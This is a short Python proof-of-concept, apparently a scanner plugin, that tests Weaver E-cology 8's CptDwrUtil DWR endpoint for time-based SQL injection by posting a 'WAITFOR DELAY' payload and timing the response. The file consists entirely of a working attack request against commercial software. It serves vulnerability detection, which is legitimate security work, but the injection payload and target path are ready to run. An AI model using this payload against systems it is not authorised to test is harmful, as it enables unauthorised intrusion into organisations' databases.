import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-cology 8 CptDwrUtil 存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'text/plain',
        'Accept-Encoding': 'gzip'
    }
    data = '''callCount=1&page=httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&batchId=0&c0-param1=string:1&c0-param0=string:1 WAITFOR DELAY '0:0:5' '''
    vurl = urllib.parse.urljoin(url, "/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr")
    try:
        response = requests.post(vurl, headers=headers, data=data ,timeout=15)
        if response.status_code == 200 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult